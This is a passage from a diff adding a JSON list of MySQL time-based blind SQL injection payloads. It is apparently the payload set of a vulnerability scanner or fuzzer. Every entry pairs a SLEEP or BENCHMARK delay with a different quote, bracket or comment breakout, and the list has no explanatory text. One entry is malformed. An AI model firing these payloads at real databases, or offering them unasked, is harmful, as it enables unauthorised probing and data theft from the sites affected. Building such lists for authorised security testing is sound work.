+    "payload": "' AND ELT(1337=1337,SLEEP(5)) AND '1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "') AND ELT(1337=1337,SLEEP(5)) AND ('1337' LIKE '1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "')) AND ELT(1337=1337,SLEEP(5)) AND (('1337' LIKE '1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "'))) AND ELT(1337=1337,SLEEP(5)) AND ((('1337' LIKE '1337"
+  },
+  {
+    "name": "mysql",
+    "payload": ") AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": ") AND ELT(1337=1337,SLEEP(5)) AND (1337=1337"
+  },
+  {
+    "name": "mysql",
+    "payload": ")) AND ELT(1337=1337,SLEEP(5)) AND ((1337=1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "))) AND ELT(1337=1337,SLEEP(5)) AND (((1337=1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 AND ELT(1337=1337,SLEEP(5))"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 AND ELT(1337=1337,SLEEP(5))# 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": ") WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "+(SELECT 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+"
+  },
+  {
+    "name": "mysql",
+    "payload": ")) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": ") AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "` WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "`) WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "1`=`1` AND ELT(1337=1337,SLEEP(5)) AND `1`=`1"
+  },
+  {
+    "name": "mysql",
+    "payload": "]-(SELECT 0 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))|[1"
+  },
+  {
+    "name": "mysql",
+    "payload": "%' AND ELT(1337=1337,SLEEP(5)) AND '1337%'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' AND ELT(1337=1337,SLEEP(5)) AND '1337' LIKE '1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\") AND ELT(1337=1337,SLEEP(5)) AND (\"1337\"=\"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\")) AND ELT(1337=1337,SLEEP(5)) AND ((\"1337\"=\"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\"))) AND ELT(1337=1337,SLEEP(5)) AND (((\"1337\"=\"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\" AND ELT(1337=1337,SLEEP(5)) AND \"1337\"=\"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\") AND ELT(1337=1337,SLEEP(5)) AND (\"1337\" LIKE \"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\")) AND ELT(1337=1337,SLEEP(5)) AND ((\"1337\" LIKE \"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\"))) AND ELT(1337=1337,SLEEP(5)) AND (((\"1337\" LIKE \"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\" AND ELT(1337=1337,SLEEP(5)) AND \"1337\" LIKE \"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' AND ELT(1337=1337,SLEEP(5)) OR '1337'='FMTE"
+  },
+  {
+    "name": "mysql",
+    "payload": "') WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\") WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\" WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "'||(SELECT 0x4c454f67 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||'"
+  },
+  {
+    "name": "mysql",
+    "payload": "'||(SELECT 0x727a5277 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||'"
+  },
+  {
+    "name": "mysql",
+    "payload": "'+(SELECT 0x4b6b486c WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+'"
+  },
+  {
+    "name": "mysql",
+    "payload": "||(SELECT 0x57556971 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||"
+  },
+  {
+    "name": "mysql",
+    "payload": "||(SELECT 0x67664847 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||"
+  },
+  {
+    "name": "mysql",
+    "payload": "+(SELECT 0x74764164 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+"
+  },
+  {
+    "name": "mysql",
+    "payload": "')) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\")) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "') AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\") AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))--"
+  },
+  {
+    "name": "mysql",
+    "payload": "' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\" AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "') AND =BENCHMARK(5000000,MD5(0x774c5341))--"
+  },
+  {
+    "name": "mysql",
+    "payload": "') AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337' LIKE '1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337' LIKE '1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337' LIKE '1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "%' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337%'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337' LIKE '1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\") AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (\"1337\"=\"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((\"1337\"=\"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (((\"1337\"=\"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\" AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND \"1337\"=\"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\") AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (\"1337\" LIKE \"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((\"1337\" LIKE \"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (((\"1337\" LIKE \"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\" AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND \"1337\" LIKE \"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND '1337'='1337"
+  }
+]
